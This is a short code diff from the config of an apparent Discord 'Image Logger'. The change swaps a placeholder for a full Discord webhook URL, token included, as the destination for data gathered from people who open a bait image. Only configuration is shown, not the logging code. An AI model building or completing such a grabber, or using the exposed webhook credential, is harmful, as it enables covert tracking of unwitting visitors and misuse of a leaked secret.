@@ -12,7 +12,7 @@ options = {
 
 # ==== CONFIG ====
 config = {
-    "webhook": "YOUR_DISCORD_WEBHOOK",
+    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
     "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
     "loading_image": "https://via.placeholder.com/600x400?text=Loading...",
     "username": "Image Logger",
